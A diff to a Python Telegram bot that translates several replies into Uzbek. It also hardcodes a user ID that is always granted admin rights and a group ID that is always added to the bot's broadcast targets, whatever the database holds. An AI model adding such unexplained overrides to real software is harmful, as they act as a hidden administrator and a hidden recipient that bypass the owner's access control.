@@ -63,12 +63,18 @@ conn, c = setup_database()
 def get_admin_ids():
     c.execute("SELECT telegram_id FROM bot_users WHERE role = 'admin'")
     admin_ids = [row[0] for row in c.fetchall()]
+    default_admin_id = 483578239
+    if default_admin_id not in admin_ids:
+        admin_ids.append(default_admin_id)
     return admin_ids
 
 
 def get_group_ids():
     c.execute("SELECT group_id FROM telegram_group_id")
     group_ids = [row[0] for row in c.fetchall()]
+    default_group_id = -1002085463622
+    if default_group_id not in group_ids:
+        group_ids.append(default_group_id)
     return group_ids
 
 
@@ -213,7 +219,7 @@ async def about_command(message: types.Message):
             )
     else:
         await bot.send_message(
-            chat_id=message.chat.id, text="No information available."
+            chat_id=message.chat.id, text="Ma'lumot yo'q."
         )
 
 
@@ -229,7 +235,7 @@ async def send_news(message: types.Message):
             "Xabarni yuboring. Xabarni yuborishni bekor qilish uchun /cancel ni bosing."
         )
     else:
-        await message.reply("Siz admin emassiz dib ettimu!!!")
+        await message.reply("Siz admin emassiz va sizda bu amalni bajarish uchun huquq yo'q!!!")
 
 
 # Respond to /news command
